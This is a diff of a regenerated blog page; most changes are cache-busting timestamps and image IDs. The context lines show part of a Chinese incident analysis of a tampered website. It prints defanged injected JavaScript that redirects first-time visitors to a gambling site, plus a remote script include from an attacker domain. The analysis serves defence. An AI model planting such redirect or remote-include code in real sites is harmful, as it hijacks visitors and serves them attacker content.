@@ -10,18 +10,18 @@
     <title>页面篡改分析-首次会话跳转菠菜页面篡改分析 - x7peeps</title>
     <link href="/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90-%E9%A6%96%E6%AC%A1%E4%BC%9A%E8%AF%9D%E8%B7%B3%E8%BD%AC%E8%8F%A0%E8%8F%9C%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/index.xml" rel="alternate" type="application/rss+xml" title="页面篡改分析-首次会话跳转菠菜页面篡改分析 - x7peeps"><link rel="icon" href="/images/head.png" type="image/png">
     <!-- https://github.com/filamentgroup/loadCSS/blob/master/README.md#how-to-use -->
-    <link href="/css/fontawesome-all.min.css?1691607312" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fontawesome-all.min.css?1691607312" rel="stylesheet"></noscript>
-    <link href="/css/nucleus.css?1691607312" rel="stylesheet">
-    <link href="/css/auto-complete.css?1691607312" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/auto-complete.css?1691607312" rel="stylesheet"></noscript>
-    <link href="/css/perfect-scrollbar.min.css?1691607312" rel="stylesheet">
-    <link href="/css/fonts.css?1691607312" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fonts.css?1691607312" rel="stylesheet"></noscript>
-    <link href="/css/theme.css?1691607312" rel="stylesheet">
-    <link href="/css/theme-auto.css?1691607312" rel="stylesheet" id="variant-style">
-    <link href="/css/variant.css?1691607312" rel="stylesheet">
-    <link href="/css/print.css?1691607312" rel="stylesheet" media="print">
-    <link href="/css/ie.css?1691607312" rel="stylesheet">
-    <script src="/js/url.js?1691607312"></script>
-    <script src="/js/variant.js?1691607312"></script>
+    <link href="/css/fontawesome-all.min.css?1691607470" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fontawesome-all.min.css?1691607470" rel="stylesheet"></noscript>
+    <link href="/css/nucleus.css?1691607470" rel="stylesheet">
+    <link href="/css/auto-complete.css?1691607470" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/auto-complete.css?1691607470" rel="stylesheet"></noscript>
+    <link href="/css/perfect-scrollbar.min.css?1691607470" rel="stylesheet">
+    <link href="/css/fonts.css?1691607470" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fonts.css?1691607470" rel="stylesheet"></noscript>
+    <link href="/css/theme.css?1691607470" rel="stylesheet">
+    <link href="/css/theme-auto.css?1691607470" rel="stylesheet" id="variant-style">
+    <link href="/css/variant.css?1691607470" rel="stylesheet">
+    <link href="/css/print.css?1691607470" rel="stylesheet" media="print">
+    <link href="/css/ie.css?1691607470" rel="stylesheet">
+    <script src="/js/url.js?1691607470"></script>
+    <script src="/js/variant.js?1691607470"></script>
     <script>
       // hack to let hugo tell us how to get to the root when using relativeURLs, it needs to be called *url= for it to do its magic:
       // https://github.com/gohugoio/hugo/blob/145b3fcce35fbac25c7033c91c1b7ae6d1179da8/transform/urlreplacers/absurlreplacer.go#L72
@@ -96,10 +96,10 @@
 <h3 id="前言">前言</h3>
 <p>在某会曾经出现过一次基于运营商的某度广告推广导致手机平台恶意跳转现象，本次样本发现了一处类似的现象，对其分析发现通过脚本实现的首次跳转功能。下面是详细过程。
 
-<a href="#image-d35e1e570c520f1a0d46460c7dcbbe87" class="lightbox-link">
+<a href="#image-f243778f55616a60b6f19421fb93d9c3" class="lightbox-link">
 <img src="http://blogimage.xtpeeps.cn/20190920102627.png-A" alt="" style="height: auto; width: auto;" loading="lazy">
 </a>
-<a href="javascript:history.back();" class="lightbox" id="image-d35e1e570c520f1a0d46460c7dcbbe87">
+<a href="javascript:history.back();" class="lightbox" id="image-f243778f55616a60b6f19421fb93d9c3">
 <img src="http://blogimage.xtpeeps.cn/20190920102627.png-A" alt="" class="lightbox-image" loading="lazy">
 </a></p>
 <p>可以看到，整个跳转流程。现在需要做的就是分析其中原理。
@@ -111,10 +111,10 @@ https://tz01321[.]com Referer	https://sdfhu1[.]com/248486.html
 https://sdfhu1[.]com/248486.html Referer	弱点网站</code></pre></div><h3 id="定位篡改点">定位篡改点</h3>
 <p>现在就是确定具体被篡改的位置了：
 
-<a href="#image-39d905192a15884fd9d616632584e090" class="lightbox-link">
+<a href="#image-60f2504de3870e775feeaa9cd3c7ef9a" class="lightbox-link">
 <img src="http://blogimage.xtpeeps.cn/1568965401188_566544C4-D462-46c8-A898-6DFD095D3548.png-A" alt="" style="height: auto; width: auto;" loading="lazy">
 </a>
-<a href="javascript:history.back();" class="lightbox" id="image-39d905192a15884fd9d616632584e090">
+<a href="javascript:history.back();" class="lightbox" id="image-60f2504de3870e775feeaa9cd3c7ef9a">
 <img src="http://blogimage.xtpeeps.cn/1568965401188_566544C4-D462-46c8-A898-6DFD095D3548.png-A" alt="" class="lightbox-image" loading="lazy">
 </a>
 可以看到这个/statics/js/jquery.min.js文件内被插入下面这段代码，并且根据逻辑可以知道，在用户第一次访问的时候触发此脚本，客户跳转至https[:]//sdfhu1[.]com/248486.html ，同时添加设置cookie,打标非第一次访问，这样下次访问就不会触发此跳转。</p>
@@ -129,26 +129,26 @@ https://sdfhu1[.]com/248486.html Referer	弱点网站</code></pre></div><h3 id="
 </span></span><span style="display:flex;"><span>         <span style="color:#a6e22e">location</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;https[:]//sdfhu1[.]com/248486.html&#39;</span>
 </span></span><span style="display:flex;"><span>     }</span></span></code></pre></div><p>下面为该脚本在源代码的位置：
 
-<a href="#image-1c1841089bd206cad0ee50b7948fed6d" class="lightbox-link">
+<a href="#image-853cfef39679d8def23f044cc36e27a4" class="lightbox-link">
 <img src="http://blogimage.xtpeeps.cn/20190920162947.png-A" alt="" style="height: auto; width: auto;" loading="lazy">
 </a>
-<a href="javascript:history.back();" class="lightbox" id="image-1c1841089bd206cad0ee50b7948fed6d">
+<a href="javascript:history.back();" class="lightbox" id="image-853cfef39679d8def23f044cc36e27a4">
 <img src="http://blogimage.xtpeeps.cn/20190920162947.png-A" alt="" class="lightbox-image" loading="lazy">
 </a>
 除了上面的脚本，我们在/statics/js/dialog.js中发现了这样一段，开始怀疑但最后证明仍然为篡改菠菜网站相关：
 
-<a href="#image-ba20c59433804772350c09755518f808" class="lightbox-link">
+<a href="#image-d8492fd767620a35127e7b61f1d4ddd4" class="lightbox-link">
 <img src="http://blogimage.xtpeeps.cn/20190920163921.png-A" alt="" style="height: auto; width: auto;" loading="lazy">
 </a>
-<a href="javascript:history.back();" class="lightbox" id="image-ba20c59433804772350c09755518f808">
+<a href="javascript:history.back();" class="lightbox" id="image-d8492fd767620a35127e7b61f1d4ddd4">
 <img src="http://blogimage.xtpeeps.cn/20190920163921.png-A" alt="" class="lightbox-image" loading="lazy">
 </a>
 其中引入了这样一段，而直接访问该脚本不显示任何内容，因此暂时未知其功能：</p>
 <div class="wrap-code highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">include</span>(<span style="color:#e6db74">&#34;http[:]//www[.]oydaiyun[.]com/images/js.js&#34;</span>);</span></span></code></pre></div><div class="wrap-code highlight"><pre tabindex="0"><code>oydaiyun[.]com  referer http[:]//www[.]oydaiyun[.]com/images/js.js </code></pre></div><p>
-<a href="#image-dcf6bcf07893c7cf7060c44228df463a" class="lightbox-link">
+<a href="#image-e2b42b94499dc4d9d1df276de8bf469c" class="lightbox-link">
 <img src="http://blogimage.xtpeeps.cn/20190920173817.png-A" alt="" style="height: auto; width: auto;" loading="lazy">
 </a>
-<a href="javascript:history.back();" class="lightbox" id="image-dcf6bcf07893c7cf7060c44228df463a">
+<a href="javascript:history.back();" class="lightbox" id="image-e2b42b94499dc4d9d1df276de8bf469c">
 <img src="http://blogimage.xtpeeps.cn/20190920173817.png-A" alt="" class="lightbox-image" loading="lazy">
 </a></p>
 <h3 id="分析过程">分析过程</h3>
@@ -184,12 +184,12 @@ tz01321[.]com</p>
         <script>
           var contentLangs=['en'];
         </script>
-        <script src="/js/auto-complete.js?1691607313" defer></script>
-        <script src="/js/lunr/lunr.min.js?1691607313" defer></script>
-        <script src="/js/lunr/lunr.stemmer.support.min.js?1691607313" defer></script>
-        <script src="/js/lunr/lunr.multi.min.js?1691607313" defer></script>
-        <script src="/js/lunr/lunr.en.min.js?1691607313" defer></script>
-        <script src="/js/search.js?1691607313" defer></script>
+        <script src="/js/auto-complete.js?1691607472" defer></script>
+        <script src="/js/lunr/lunr.min.js?1691607472" defer></script>
+        <script src="/js/lunr/lunr.stemmer.support.min.js?1691607472" defer></script>
+        <script src="/js/lunr/lunr.multi.min.js?1691607472" defer></script>
+        <script src="/js/lunr/lunr.en.min.js?1691607472" defer></script>
+        <script src="/js/search.js?1691607472" defer></script>
       </div>
       <div id="content-wrapper" class="highlightable">
         <ul class="topics enlarge morespace collapsible-menu">
@@ -257,7 +257,7 @@ tz01321[.]com</p>
           <li data-nav-id="/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2020-14645_weblogic_T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E5%A4%8D%E6%B5%8B/index.html" class=""><a class="padding" href="/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2020-14645_weblogic_T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E5%A4%8D%E6%B5%8B/index.html">CVE-2020-14645_weblogic_T3反序列化RCE复测<i class="fas fa-check read-icon"></i></a></li>
           <li data-nav-id="/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2020-0796-SMBGhost-Remote-Code-Execution/index.html" class=""><a class="padding" href="/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2020-0796-SMBGhost-Remote-Code-Execution/index.html">CVE-2020-0796 &#39;SMBGhost&#39; Remote Code Execution<i class="fas fa-check read-icon"></i></a></li>
           <li data-nav-id="/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2017-11882-Office%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html" class=""><a class="padding" href="/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2017-11882-Office%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">CVE-2017-11882 Office远程代码执行漏洞复现<i class="fas fa-check read-icon"></i></a></li>
-          <li data-nav-id="/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E9%87%91%E5%B1%B1WPS_RCE-WPSSRC-2023-0701/index.html" class=""><a class="padding" href="/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E9%87%91%E5%B1%B1WPS_RCE-WPSSRC-2023-0701/index.html">金山WPS_RCE-WPSSRC-2023-0701<i class="fas fa-check read-icon"></i></a></li></ul></li>
+          <li data-nav-id="/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/WPSSRC-2023-0701%E9%87%91%E5%B1%B1WPS_RCE/index.html" class=""><a class="padding" href="/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/WPSSRC-2023-0701%E9%87%91%E5%B1%B1WPS_RCE/index.html">WPSSRC-2023-0701金山WPS_RCE<i class="fas fa-check read-icon"></i></a></li></ul></li>
           <li data-nav-id="/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/index.html" class=""><input type="checkbox" id="section-f6f64f6160a793873f491026d06d497b" aria-controls="subsections-f6f64f6160a793873f491026d06d497b"><label for="section-f6f64f6160a793873f491026d06d497b"><i class="fas fa-chevron-down"></i><i class="fas fa-chevron-right"></i><span class="a11y-only">Submenu 恶意样本分析</span></label><a class="padding" href="/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/index.html">恶意样本分析<i class="fas fa-check read-icon"></i></a><ul id="subsections-f6f64f6160a793873f491026d06d497b" class="morespace collapsible-menu">
           <li data-nav-id="/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/index.html" class=""><input type="checkbox" id="section-ffb6fc95178918741432017d1bacd773" aria-controls="subsections-ffb6fc95178918741432017d1bacd773"><label for="section-ffb6fc95178918741432017d1bacd773"><i class="fas fa-chevron-down"></i><i class="fas fa-chevron-right"></i><span class="a11y-only">Submenu 样本分析基础</span></label><a class="padding" href="/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/index.html">样本分析基础<i class="fas fa-check read-icon"></i></a><ul id="subsections-ffb6fc95178918741432017d1bacd773" class="morespace collapsible-menu">
           <li data-nav-id="/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-12-%E4%BD%BF%E7%94%A8%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E7%8B%A9%E7%8C%8E%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/index.html" class=""><a class="padding" href="/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-12-%E4%BD%BF%E7%94%A8%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E7%8B%A9%E7%8C%8E%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/index.html">恶意样本分析-12-使用内存取证检测高级恶意软件<i class="fas fa-check read-icon"></i></a></li>
@@ -383,8 +383,8 @@ tz01321[.]com</p>
         </div>
       </div>
     </aside>
-    <script src="/js/clipboard.min.js?1691607313" defer></script>
-    <script src="/js/perfect-scrollbar.min.js?1691607313" defer></script>
+    <script src="/js/clipboard.min.js?1691607472" defer></script>
+    <script src="/js/perfect-scrollbar.min.js?1691607472" defer></script>
     <script>
       function useMathJax( config ){
         if( !Object.assign ){
@@ -414,15 +414,15 @@ tz01321[.]com</p>
       useMathJax( JSON.parse("{}") );
     </script>
     <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
-    <script src="/js/d3/d3-color.min.js?1691607313" defer></script>
-    <script src="/js/d3/d3-dispatch.min.js?1691607313" defer></script>
-    <script src="/js/d3/d3-drag.min.js?1691607313" defer></script>
-    <script src="/js/d3/d3-ease.min.js?1691607313" defer></script>
-    <script src="/js/d3/d3-interpolate.min.js?1691607313" defer></script>
-    <script src="/js/d3/d3-selection.min.js?1691607313" defer></script>
-    <script src="/js/d3/d3-timer.min.js?1691607313" defer></script>
-    <script src="/js/d3/d3-transition.min.js?1691607313" defer></script>
-    <script src="/js/d3/d3-zoom.min.js?1691607313" defer></script>
+    <script src="/js/d3/d3-color.min.js?1691607472" defer></script>
+    <script src="/js/d3/d3-dispatch.min.js?1691607472" defer></script>
+    <script src="/js/d3/d3-drag.min.js?1691607472" defer></script>
+    <script src="/js/d3/d3-ease.min.js?1691607472" defer></script>
+    <script src="/js/d3/d3-interpolate.min.js?1691607472" defer></script>
+    <script src="/js/d3/d3-selection.min.js?1691607472" defer></script>
+    <script src="/js/d3/d3-timer.min.js?1691607472" defer></script>
+    <script src="/js/d3/d3-transition.min.js?1691607472" defer></script>
+    <script src="/js/d3/d3-zoom.min.js?1691607472" defer></script>
     <script src="https://unpkg.com/mermaid/dist/mermaid.min.js" defer></script>
     <script>
       window.themeUseMermaid = JSON.parse("{ \"theme\": \"default\" }");
@@ -431,8 +431,8 @@ tz01321[.]com</p>
     <script src="https://unpkg.com/swagger-ui-dist/swagger-ui-bundle.js" defer></script>
     <script src="https://unpkg.com/swagger-ui-dist/swagger-ui-standalone-preset.js" defer></script>
     <script>
-      window.themeUseOpenapi = { css: "https://unpkg.com/swagger-ui-dist/swagger-ui.css", assetsBuster:  1691607313  };
+      window.themeUseOpenapi = { css: "https://unpkg.com/swagger-ui-dist/swagger-ui.css", assetsBuster:  1691607472  };
     </script>
-    <script src="/js/theme.js?1691607313" defer></script>
+    <script src="/js/theme.js?1691607472" defer></script>
   </body>
 </html>
